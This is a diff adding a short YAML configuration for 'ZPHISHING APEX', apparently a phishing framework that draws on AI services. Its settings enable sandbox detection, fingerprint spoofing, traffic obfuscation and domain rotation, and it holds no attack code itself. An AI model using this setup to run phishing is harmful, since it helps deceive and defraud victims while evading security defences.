@@ -1,0 +1,28 @@
+# ZPHISHING APEX Configuration
+
+server:
+  host: 0.0.0.0
+  port: 8080
+  debug: false
+
+database:
+  url: postgresql://zphishing:zphishing@localhost/zphishing_db
+
+redis:
+  url: redis://localhost:6379/0
+
+ai:
+  openai_api_key: ${OPENAI_API_KEY}
+  anthropic_api_key: ${ANTHROPIC_API_KEY}
+
+evasion:
+  sandbox_detection: true
+  fingerprint_spoofing: true
+  traffic_obfuscation: true
+  domain_rotation: true
+
+infrastructure:
+  auto_scale: false
+  providers:
+    - docker
+    - kubernetes
